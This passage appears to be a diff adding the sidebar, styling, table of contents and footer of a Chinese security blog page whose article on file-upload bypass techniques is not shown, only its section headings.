href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">14</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">10</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">10</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-article-text">引言</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-article-text">服务端的检测与绕过方法</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MIME-%E7%BC%96%E7%A0%81"><span class="toc-article-text">MIME 编码</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%EF%BC%88%E4%B8%8A%E4%BC%A0%E4%B8%8D%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-article-text">文件上传常见问题（上传不回显）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%89%8D%E7%BD%AE%E5%90%8D"><span class="toc-article-text">截断文件前置名</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87%E5%AE%9D%E5%A1%94%E9%99%90%E5%88%B6%EF%BC%88%E7%9C%8B%E5%85%B7%E4%BD%93%E6%83%85%E5%86%B5%EF%BC%89"><span class="toc-article-text">绕过宝塔限制（看具体情况）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%EF%BC%9A%E4%B8%8D%E5%90%8C%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E6%94%AF%E6%8C%81%E7%9A%84%E8%A7%A3%E6%9E%90%E5%90%8E%E7%BC%80"><span class="toc-article-text">黑名单绕过：不同脚本语言支持的解析后缀</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%A3%80%E6%B5%8B%E5%90%8E%E7%BC%80%E7%9A%84%E5%BD%A2%E5%BC%8F%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-article-text">白名单绕过：针对安全设备检测后缀的形式进行绕过</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-article-text">条件竞争</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-WAF-%E7%BB%95%E8%BF%87"><span class="toc-article-text">文件上传 WAF 绕过</span></a></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/copy-code.js"></script>
+
+   <script type="text/javascript">
+     var searchPath = "/search.xml";
+   </script>
+
+
+<script src="/js/search.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+   </html>
